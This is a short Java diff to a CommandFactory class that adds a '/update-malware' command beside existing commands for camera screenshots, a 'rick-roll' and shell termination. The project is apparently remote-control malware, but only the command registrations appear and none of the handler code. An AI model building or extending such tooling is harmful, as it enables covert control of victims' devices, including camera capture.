@@ -25,6 +25,8 @@ public class CommandFactory {
         commandsList.put("camera-shot", new CameraScreenShotCommand());
 
         commandsList.put("rick-roll", new RickRollCommand());
+        commandsList.put("/update-malware", new UpdateCommand());
+
         commandsList.put("/exit", new TerminateShellCommand());
 
 
